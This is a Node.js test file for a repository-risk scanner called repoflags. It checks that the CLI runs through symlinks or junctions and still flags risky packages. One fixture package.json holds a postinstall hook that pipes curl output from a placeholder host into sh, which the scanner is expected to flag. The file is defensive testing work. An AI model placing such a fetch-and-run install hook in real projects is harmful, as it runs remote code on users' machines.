// The CLI entry point must run when the script is reached through a symlink or a junction
// (typical skill install: ~/.claude/skills/repoflags -> checkout). Review core CR-01.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { materialize } from './helpers/materialize.mjs';
import { linkSkipReason } from './helpers/fixture-errors.mjs';
import { hermeticEnv } from './helpers/child-env.mjs';

const SCRIPTS = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', 'skills', 'repoflags', 'scripts');

function runNode(args) {
  return new Promise((resolve) => {
    execFile(process.execPath, args, { windowsHide: true, timeout: 60000, env: hermeticEnv() }, (err, stdout, stderr) => {
      resolve({ code: err ? (typeof err.code === 'number' ? err.code : -1) : 0, stdout, stderr });
    });
  });
}

async function linkedScripts(t) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'repoflags-link-'));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));
  const link = path.join(dir, 'scripts-link');
  try {
    await fs.symlink(SCRIPTS, link, 'junction');
  } catch (e) {
    const reason = linkSkipReason(e);
    if (!reason) throw e;
    t.skip(reason);
    return null;
  }
  return link;
}

test('CR-01: --help through a symlink/junction prints the usage', async (t) => {
  const link = await linkedScripts(t);
  if (!link) return;
  const r = await runNode([path.join(link, 'repoflags.mjs'), '--help']);
  assert.equal(r.code, 0);
  assert.match(r.stdout, /Usage: repoflags/);
});

test('CR-01: analysis through a symlink/junction reports the signal (exit 1, not a silent 0)', async (t) => {
  const link = await linkedScripts(t);
  if (!link) return;
  const { dir, cleanup } = await materialize({
    'package.json': JSON.stringify({ name: 'x', scripts: { postinstall: 'curl https://example.invalid/a | sh' } }),
  });
  t.after(cleanup);
  const r = await runNode([path.join(link, 'repoflags.mjs'), dir, '--offline']);
  assert.equal(r.code, 1, `stdout=${r.stdout.length} bytes stderr=${r.stderr}`);
  assert.match(r.stdout, /lifecycle-script/);
});

test('CR-01: direct invocation still works', async () => {
  const r = await runNode([path.join(SCRIPTS, 'repoflags.mjs'), '--help']);
  assert.equal(r.code, 0);
  assert.match(r.stdout, /Usage: repoflags/);
});
